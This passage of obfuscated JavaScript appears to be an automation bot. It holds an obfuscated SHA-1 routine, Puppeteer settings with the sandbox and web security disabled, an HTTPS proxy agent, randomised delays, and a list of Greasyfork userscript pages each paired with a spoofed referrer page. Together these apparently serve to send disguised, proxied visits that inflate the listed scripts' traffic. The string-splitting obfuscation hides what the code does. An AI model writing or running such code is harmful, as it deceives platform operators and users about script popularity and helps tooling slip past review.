            v = (u = (w = (u = (x = (u = (y = (u = (z = (u = v << -0x12cd * -0x1 + -0xf0 * -0x1 + 0x8 * -0x277 | v >>> -0xbf * 0x1 + -0x20c * 0x8 + 0x113a) + (w & x | ~w & y) + z + (0x3cdba5 * 0x241 + 0x1 * -0x43d6bd97 + -0x1 * -0x152e284b) + A[q] << 0x622 + 0x106c + 0xb47 * -0x2) << -0x2 * 0x1337 + 0x3 * -0xb89 + 0x490e | z >>> 0x611 * 0x1 + 0x61 * -0x1d + -0xd * -0x63) + (v & (w = w << -0x2371 + -0x89d + 0x2c2c | w >>> -0x6d6 + -0x421 * -0x1 + 0x8b * 0x5) | ~v & x) + y + (0x588cba1b * 0x1 + -0x6983c89f + 0x6b79881d) + A[q + (-0x265a + 0x1a09 + -0xc52 * -0x1)] << -0xc8d + -0x578 + 0x1205) << 0x7 * 0x579 + -0x8 * -0x241 + -0x2 * 0x1c29 | y >>> -0x1142 + 0x3a1 + 0xdbc) + (z & (v = v << -0xf3d + -0x70b + -0x5e * -0x3d | v >>> -0x1a6e + -0x96f + 0x23df) | ~z & w) + x + (0x111483af + 0x58c9 * 0x1a78f + -0xa7ed27b * 0x7) + A[q + (-0xed0 + -0xa * -0x353 + -0x126c)] << -0xa39 * 0x2 + -0x392 + 0x2 * 0xc02) << 0x27 * 0xa7 + 0x3 * 0x9a9 + -0x1 * 0x3667 | x >>> 0x1 * 0x1a8c + 0x23f3 * 0x1 + -0x3e64) + (y & (z = z << -0xf * -0x1 + 0x3 * -0x997 + 0x735 * 0x4 | z >>> 0x346 * 0x9 + -0x1ca9 + -0xcb) | ~y & v) + w + (-0x5ce7145d + -0x16 * 0x6d4ab49 + 0x15455f4 * 0xfb) + A[q + (-0xd * -0x53 + -0x1ab0 * 0x1 + 0x59f * 0x4)] << 0x59 * 0x22 + -0x5 * 0x407 + 0x851 * 0x1) << 0x10a9 + 0x860 + -0x1904 | w >>> -0x1 * 0x1337 + 0xf39 * -0x1 + 0x228b) + (x & (y = y << -0x1 * 0x134f + -0x1bb1 + 0x2f1e | y >>> -0x465 + 0x1e24 + -0xb * 0x257) | ~x & z) + v + (-0x1 * -0x941c28d + -0xa9b6426b + 0x9 * 0x1be28d7f) + A[q + (0x2 * -0xe93 + -0xe * 0x15b + 0x1812 * 0x2)] << -0x1fe + -0xc01 + -0x1 * -0xdff, x = x << 0x17e + -0x2388 + 0x2228 | x >>> -0xa20 + -0x1bfc + -0x7 * -0x572;
          for (; q < 0x2d7 * -0x3 + 0x2e5 * -0xb + 0x2884 * 0x1; q += 0xa13 * -0x1 + -0x1 * -0x227f + -0x1867)
            v = (u = (w = (u = (x = (u = (y = (u = (z = (u = v << -0x302 + -0x2582 + -0xd83 * -0x3 | v >>> 0x631 + -0xd * 0x1d + -0x49d * 0x1) + (w ^ x ^ y) + z + (0x1b1 * 0x7828d4 + 0x3549a79e * 0x4 + -0x13189c16b) + A[q] << 0x587 + -0x1f * -0x9 + -0x69e) << 0x29b * 0x5 + 0x3bc * 0x4 + -0xdf9 * 0x2 | z >>> 0x1d3 * 0x1 + 0xe8b + 0xb5 * -0x17) + (v ^ (w = w << -0x2ca + 0x2d * 0x43 + -0x8df * 0x1 | w >>> 0x51e + 0x4c2 + 0x2 * -0x4ef) ^ x) + y + (0x86a2a9b5 + 0x4c666c47 + -0x642f2a5b) + A[q + (-0xb82 * 0x3 + -0x2 * 0xb89 + 0x3999)] << 0xcae + -0x2 * -0xa2f + -0x34e * 0xa) << -0x10dc + 0x257e + -0x6df * 0x3 | y >>> 0x26 * -0x2 + -0x53 * -0x69 + 0x10d2 * -0x2) + (z ^ (v = v << -0x10f7 * -0x1 + -0xcb3 * 0x3 + -0xa * -0x220 | v >>> -0x6b * 0x2b + 0x198f + -0x14 * 0x61) ^ w) + x + (0xd6d0ce3d + -0x2924596f + -0x3ed2892d) + A[q + (0x2538 + -0x3df + -0x2157)] << -0x2212 + -0x1b7 + 0x23c9) << 0x265b + -0x56d + -0x695 * 0x5 | x >>> -0x197e + 0x215b + -0x296 * 0x3) + (y ^ (z = z << -0x44b + -0xbb * -0x7 + -0xb4 | z >>> 0x1a * -0xdb + -0x2437 + 0x3a77) ^ v) + w + (0x9e348c2e + 0x14656 * -0x92bc + 0x1 * 0x8bb2129b) + A[q + (-0x719 * -0x5 + 0x2 * 0x27d + 0xd7c * -0x3)] << 0x2 * 0xb66 + -0x196 * -0x4 + -0x1d24) << -0x9e1 + 0x1af2 + 0x4 * -0x443 | w >>> 0x1 * -0x5ed + -0xc2e + 0x1236) + (x ^ (y = y << 0x1d * 0x11e + -0x1d * -0x95 + -0x3129 | y >>> 0x268f * 0x1 + 0xef9 * 0x1 + -0x3586) ^ z) + v + (0x9 * -0x14f43ebe + 0x252a5b0e + -0x13e351b * -0xd3) + A[q + (-0x252d + -0x248a + -0x49bb * -0x1)] << -0x1331 + -0xe02 * -0x2 + -0x2f1 * 0x3, x = x << -0x1 * -0xa6 + 0x374 + -0x3fc | x >>> -0x4 * -0x404 + -0x4b * -0x53 + 0xf * -0x2b1;
          for (; q < -0x179 * -0x5 + -0x15e5 * -0x1 + -0x1d06; q += -0x173 + -0x3ae * 0x1 + -0x1 * -0x526)
            v = (u = (w = (u = (x = (u = (y = (u = (z = (u = v << 0x25c9 + 0x73 + 0x9 * -0x43f | v >>> -0x16c4 + -0x1615 + 0x6 * 0x77e) + (w & x | w & y | x & y) + z - (0x1 * 0x10afaac5 + 0x1a57 * 0x80b86 + -0x8e66117 * 0xd) + A[q] << 0x19 * -0x110 + 0x137 * -0x1d + 0x3dcb) << 0xd * 0x162 + -0x2689 + 0x6dc * 0x3 | z >>> 0xa9 * -0xf + -0xb8f + 0x1591) + (v & (w = w << -0xaff * 0x3 + 0x70d + 0x1a0e | w >>> 0x44a + 0x78d * -0x5 + 0xb * 0x30b) | v & x | w & x) + y - (0x480d4055 + -0xc5554f6d + 0x15a6f034 * 0xb) + A[q + (-0x4f9 + -0x15 * -0xb1 + -0x98b)] << 0xc9 * -0x11 + 0x1c40 + 0x5 * -0x2fb) << 0x1 * 0x26f3 + 0xb * 0x2e + -0x28e8 | y >>> -0x1 * -0xedb + 0x1889 + -0x2749) + (z & (v = v << 0x1 * -0x17b3 + -0x20ab + 0x387c | v >>> -0x207d + 0x11a * 0x1e + -0x2f * 0x3) | z & w | v & w) + x - (0xb8178853 + 0x16a8bad8 + -0x1ab1 * 0x38437) + A[q + (0x1589 * -0x1 + -0xa7 + 0x1632)] << 0x46b + 0x1d59 + 0x871 * -0x4) << -0x1 * 0xe79 + 0x1217 + -0x133 * 0x3 | x >>> -0xc5 * 0x6 + -0x6 * -0x75 + 0x1fb * 0x1) + (y & (z = z << -0x178c + 0x1268 + 0x542 | z >>> -0x1b7d + 0x1eec + -0x36d) | y & v | z & v) + w - (-0x9f67d33 + 0xeec3 * -0xd6cf + 0x14332d204 * 0x1) + A[q + (0xfe4 + 0x8 * -0xfe + 0x6b * -0x13)] << -0x421 * 0x6 + 0x84f + 0x1077) << -0x5ab + 0x2676 + -0x20c6 | w >>> 0x2 * 0xc1 + 0x54f + -0x6b6) + (x & (y = y << -0x3a * 0x2 + 0xe7b + -0xde9 | y >>> 0x214b * 0x1 + -0x3 * -0x248 + -0x2821 * 0x1) | x & z | y & z) + v - (-0x65815713 * 0x1 + 0x436d5a61 + -0x4226 * -0x238c9) + A[q + (-0x21bf + 0x1 * -0x71b + 0x146f * 0x2)] << 0x44b + -0x1df0 + -0x521 * -0x5, x = x << -0x2703 * 0x1 + 0xb40 * -0x3 + 0x48e1 | x >>> -0x124d + 0x1080 + 0x1cf * 0x1;
          for (; q < -0x3 * -0xbc5 + -0x57d * 0x1 + -0xec1 * 0x2; q += -0x10af + -0x2624 + -0x36 * -0x104)
            v = (u = (w = (u = (x = (u = (y = (u = (z = (u = v << 0x1 * 0x1ee0 + -0x36d + -0x1b6e | v >>> 0x1e9f + 0x12f + -0x5 * 0x657) + (w ^ x ^ y) + z - (-0x18a63ec7 * 0x1 + 0x27904f * 0x18e + 0x1 * 0x10c1221f) + A[q] << -0x1a1 * 0x9 + 0xf3 + 0xdb6) << 0x1 * 0xbb5 + -0xe * -0xfd + -0x1986 | z >>> -0x3 * 0x58c + -0x2657 + -0x3716 * -0x1) + (v ^ (w = w << 0x44 * 0x11 + -0x1 * -0xe9 + -0x54f | w >>> 0xcbd + 0x3 * 0x652 + -0x3d * 0x85) ^ x) + y - (0x28a96475 * -0x1 + 0x9d * 0x31b151 + 0x3fcce3f2) + A[q + (0x1fd3 + -0x1e1d + -0x13 * 0x17)] << 0x13d8 + 0x793 + -0x1b6b) << 0x71 * -0x4b + -0x1f9d * 0x1 + 0x40bd | y >>> -0x1071 * 0x2 + -0x1747 + 0x3844) + (z ^ (v = v << -0xe69 * -0x1 + -0x1c74 + -0x19 * -0x91 | v >>> -0x1 * -0xa1d + 0x22 * 0x34 + -0x1103) ^ w) + x - (0x4cd5407 + 0x35c88b2b * 0x1 + 0x4f8a108 * -0x1) + A[q + (0x24d * 0xa + 0x4 * 0x641 + -0x3004)] << 0x1e63 * 0x1 + -0x1893 + 0x1 * -0x5d0) << 0x490 + -0x35e * -0x7 + 0x1 * -0x1c1d | x >>> 0x1b0f + 0x1db9 + -0x38ad) + (y ^ (z = z << 0x1183 + -0x1fad + 0xe48 | z >>> -0x175f + -0xd1d + 0x1 * 0x247e) ^ v) + w - (-0x4b73074c + -0x1d3cf0 * 0x8f + 0x91654f86) + A[q + (-0x33c + 0x179b * -0x1 + -0x1 * -0x1ada)] << -0x719 + -0x8 * 0x3ca + -0x1 * -0x2569) << 0x24b3 + 0x1021 * 0x2 + -0x44f0 | w >>> -0xc * 0xfb + 0x1b8d * -0x1 + 0x276c) + (x ^ (y = y << 0x1808 + -0xb72 + -0xc78 | y >>> -0x762 + -0x14df + 0x1 * 0x1c43) ^ z) + v - (0x29a253c5 + 0x4144e97 * 0x2 + 0x3d24d37) + A[q + (0x41e * -0x2 + 0x86b * -0x1 + 0x1 * 0x10ab)] << -0x23af + 0x1 * 0x2089 + 0x326, x = x << 0x1d76 + -0x1411 + -0x947 | x >>> 0xf07 + 0x13e1 + -0x22e6 * 0x1;
          this['h0'] = this['h0'] + v << 0x1 * 0xc5d + -0xa92 + -0x33 * 0x9, this['h1'] = this['h1'] + w << -0x2166 + -0x5 * -0x6f7 + -0x49 * 0x5, this['h2'] = this['h2'] + x << 0x83 * -0x7 + -0x2033 * 0x1 + 0x2 * 0x11e4, this['h3'] = this['h3'] + y << -0x786 + -0x15e8 + 0x1d6e, this['h4'] = this['h4'] + z << -0x22 * 0xe2 + -0x1e7 + -0x1 * -0x1feb;
        }
        ['hex']() {
          this['finalize']();
          var q = this['h0'],
            u = this['h1'],
            v = this['h2'],
            w = this['h3'],
            x = this['h4'];
          return e[q >> -0x40 * 0x1 + 0x207b + -0x201f & -0x1155 + 0x1 * -0xc57 + 0x1dbb] + e[q >> 0x826 + 0x1176 + 0x2 * -0xcc2 & 0x204b + 0xa4c * -0x1 + -0x9 * 0x270] + e[q >> -0x1 * 0x47f + 0x3b3 + 0xe0 & -0xd * 0xa1 + 0x31 * -0x99 + 0x11 * 0x235] + e[q >> -0x1ed6 + 0x1d95 + -0x1 * -0x151 & -0x11ae + 0x1 * 0x9e3 + 0x7da] + e[q >> 0x1321 + 0x7 * 0x191 + -0x1e0c & -0x23eb + 0xce8 + 0x1712] + e[q >> -0xfb * 0x2 + -0x1907 + 0x1b05 & 0x16e6 + -0x2 * 0xfd4 + 0x8d1] + e[q >> 0x3d * -0x2 + 0x1281 + -0x1203 & 0x1adc * -0x1 + -0x845 * 0x1 + 0x466 * 0x8] + e[-0x28d + -0x28d * 0x7 + 0x1477 & q] + e[u >> -0x264e * -0x1 + -0x1bb7 + -0xa7b & 0x1b37 + -0x1 * -0x1a26 + -0x354e * 0x1] + e[u >> -0x1d62 + 0x1590 + -0x7ea * -0x1 & -0x2b0 + -0x1 * 0x230f + 0xc9a * 0x3] + e[u >> -0x12e0 + -0x680 * 0x5 + 0x3374 & -0x102d + 0x2241 * 0x1 + -0x1205] + e[u >> 0x1111 + 0x1eb5 + -0x3e * 0xc5 & -0x19cc + -0x185f * 0x1 + 0x323a] + e[u >> -0x266e * -0x1 + -0x9 * 0x235 + 0x1af * -0xb & -0x1e * 0x6d + -0x1db0 + -0x613 * -0x7] + e[u >> -0x7 * -0x4cf + -0x19a8 + -0x7f9 & -0xf45 * -0x1 + 0x14a + -0x2c * 0x60] + e[u >> -0x2e * 0x61 + 0x21ab + -0x1039 & 0x1d * -0xe5 + 0x58c + -0x4 * -0x51d] + e[0xb09 + 0x3 * 0x97f + -0x2777 * 0x1 & u] + e[v >> 0x57b * 0x3 + 0x11 * 0x3d + -0x1462 & 0x26cf * -0x1 + -0x26e4 + -0x4dc2 * -0x1] + e[v >> 0x1c2c + -0x347 + -0x1 * 0x18cd & 0x15a0 + -0x3e * 0x7b + -0x839 * -0x1] + e[v >> 0x1f5 * -0x7 + 0x62d * -0x1 + 0x13f4 * 0x1 & 0x2173 + 0x2 * 0x102 + -0x2368] + e[v >> 0x17a0 + -0x67f + -0x1111 * 0x1 & -0x2420 + -0x39b * 0x4 + 0x329b] + e[v >> -0x26 * 0x59 + 0x2542 + -0x1800 & -0x1 * -0x1b47 + 0x58 * 0x47 + 0x1c * -0x1d8] + e[v >> 0x2f * 0x1f + 0xc1b + 0x2 * -0x8e2 & -0x2066 + 0x2213 + -0x6 * 0x45] + e[v >> -0x24bb + -0x206 + 0x26c5 & -0x1 * -0xa7 + 0xa9a + -0x599 * 0x2] + e[0x1 * 0xcdb + -0x1bb8 + -0xa * -0x17e & v] + e[w >> 0x152b * -0x1 + -0x751 * 0x1 + 0x1c98 & -0x1a6d + 0x4 * -0x1af + 0x84e * 0x4] + e[w >> 0x741 + -0x68e * -0x1 + -0xdb7 & 0x1d4e + -0x746 + -0x15f9] + e[w >> -0x445 * -0x1 + -0x65f * 0x5 + 0xdd5 * 0x2 & -0xd4e * 0x1 + -0x1 * -0x1f6f + -0x1212] + e[w >> 0x1fcf + 0x1 * 0x435 + -0x8fd * 0x4 & -0xbb + -0x763 * -0x2 + -0xdfc] + e[w >> 0x243 * -0x11 + -0x20be + 0x473d & -0x678 + 0x1 * -0x1f52 + 0x25d9] + e[w >> 0x650 + 0x211a * 0x1 + 0x8e * -0x47 & 0x13 * 0x9 + -0x1824 + 0x1788] + e[w >> 0x17 * 0x10f + -0x30c + 0x1549 * -0x1 & -0xa * 0x11b + 0x367 + 0x7b6] + e[0x1b8d + -0x1ad8 * 0x1 + 0x53 * -0x2 & w] + e[x >> -0x6 * 0x95 + 0x8cb * 0x1 + -0x3 * 0x1bb & 0x235f + -0x7d * -0x47 + -0x45fb] + e[x >> 0x95d + 0x9d * 0x35 + 0x2 * -0x14e3 & 0xf * 0x9b + 0xcbe + -0x15c4] + e[x >> -0x1740 + -0x1985 + 0x30d9 & -0x5b + 0xc7a + -0xc10] + e[x >> 0x2 * 0x185 + 0x953 + -0xc4d * 0x1 & 0x1655 * 0x1 + 0x4 * 0x6d9 + 0x3d2 * -0xd] + e[x >> -0x19f3 + -0xfd2 + -0x1 * -0x29d1 & 0xa0e + -0x119 * 0x11 + 0x8aa] + e[x >> -0x25d6 + -0x1649 + 0x3c27 & -0x662 + 0x1293 + -0xc22] + e[x >> -0x12e + -0x1d17 + -0x1e49 * -0x1 & 0x874 + -0x12a7 + 0xa42] + e[-0x1 * -0x1c2b + 0x19a1 + 0x35bd * -0x1 & x];
        }
        ['digest']() {
          this['finalize']();
          var q = this['h0'],
            u = this['h1'],
            v = this['h2'],
            w = this['h3'],
            x = this['h4'];
          return [
            q >> -0x77e + -0x1 * -0x2317 + 0x1 * -0x1b81 & 0xa72 + 0x544 * 0x4 + -0x6b * 0x49,
            q >> 0x3 * -0x329 + 0x17e + 0x80d & 0x21ea + 0x1f7e + -0x4069,
            q >> -0x7 * -0x3cb + -0x12a4 + -0x7e1 & 0x4 * 0x5cb + -0xbfe + -0xed * 0xb,
            0x9e * -0x2b + 0x107c + 0xb0d & q,
            u >> -0x131d * -0x1 + 0x1 * 0x2104 + -0xb * 0x4bb & 0x67b * 0x1 + -0x2505 + 0x1 * 0x1f89,
            u >> -0x1927 + -0xea0 + -0x7 * -0x5b1 & 0x12b9 + 0x183 + -0x133d,
            u >> 0xf0b + -0xc5d + -0x2a6 & -0x501 * -0x4 + -0x270b * 0x1 + 0x1406,
            0xcb9 + -0x5c4 + -0xda * 0x7 & u,
            v >> 0x10a8 + -0x1439 + 0x3a9 & -0x257d + 0x31d * -0xa + 0x459e,
            v >> 0x2 * 0x75b + 0xa0c + 0xc59 * -0x2 & 0x1 * -0x19df + -0x245e + 0x3f3c,
            v >> -0x26 * 0x51 + 0x199a + -0xd8c & 0x1 * -0x1c0a + -0x1 * 0xeb7 + 0x46 * 0xa0, -0x7 * -0x79 + -0xa09 * 0x1 + 0x7b9 & v,
            w >> -0x2 * -0x102e + -0x20 * 0xb5 + -0x9a4 & -0x15c1 + -0x1 * 0xbfb + 0x22bb,
            w >> -0x897 + 0x60d + 0x29a & -0x1 * -0x4d5 + -0x12f + -0x2a7,
            w >> -0x3 * -0x671 + -0x20a8 + 0xd5d & 0x1355 + -0x24eb + 0x1 * 0x1295,
            0x716 + -0x1aff * -0x1 + -0x2116 & w,
            x >> 0x1 * -0xdd9 + 0x10f2 * -0x2 + -0x1f * -0x18b & -0x1 * 0xc2 + -0x3db + 0x59c * 0x1,
            x >> 0x13 * 0x209 + 0x9d4 + -0x306f & 0x8dd + 0x25 * -0xd + -0x5fd,
            x >> 0x1f6 * -0x1 + -0x4 * -0x709 + -0x1a26 & -0xb * -0xf + 0x3b * -0xb + 0x2e3,
            0x535 + -0x4bd * -0x3 + -0x126d & x
          ];
        }
        ['arrayBuffe' + 'r']() {
          var q, r;
          return this['finalize'](), q = new ArrayBuffer(-0x240a + 0x1b6b + 0x8b3), (r = new DataView(q))['setUint32'](0x9 * 0x3ee + 0x1 * 0x874 + -0x2bd2 * 0x1, this['h0']), r['setUint32'](0xb5 * -0x2 + -0x1 * -0x1a39 + -0x1 * 0x18cb, this['h1']), r['setUint32'](-0x1 * 0x1d23 + -0x92c * 0x1 + 0x5 * 0x7ab, this['h2']), r['setUint32'](0x1aa5 + 0x721 + -0x21ba, this['h3']), r['setUint32'](-0x1163 * 0x1 + 0x1cd3 + 0xe0 * -0xd, this['h4']), q;
        }
    }
    o['prototype']['toString'] = o['prototype']['hex'], o['prototype']['array'] = o['prototype']['digest'];
    const p = k();
    return p;
  })()),
  wait = f => new Promise(g => setTimeout(g, f)),
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil,
    min: min
  } = Math,
  NETWORK_PATIENCE = 0x5609 + -0x1 * -0x54b3 + 0x3dee * -0x2 + (0x1 * -0x1994 + -0x102d * 0x2 + 0x22d3 * 0x2) * random(),
  MM_NETWORK_PATIENCE = (0x24 * -0xf + -0x1 * -0x17d + 0xa2) * NETWORK_PATIENCE,
  me = random()['toString'](0x1c11 + -0x260b + -0x5 * -0x202)['substring'](0xe * 0x10a + 0x299 + -0x1121, -0xe2c + -0x1 * 0x23ef + 0x3225),
  pptOptions = {
    'headless': 0x0,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + aE(0x16),
      '--disable-' + 'web-securi' + 'ty'
    ],
    'executablePath': '/../../../' + process['env']['PUPPETEER_' + 'EXECUTABLE' + '_PATH']
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  {
    HttpsProxyAgent: HttpsProxyAgent
  } = require('https-prox' + 'y-agent'),
  data = {
    'scriptTargets': [{
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
        'preRef': aF(0x1a, '0AAR') + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + aG(0x14) + 'e/zhihu.co' + 'm'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
        'preRef': 'https://gr' + aG(0xa) + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + aG(0x8) + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
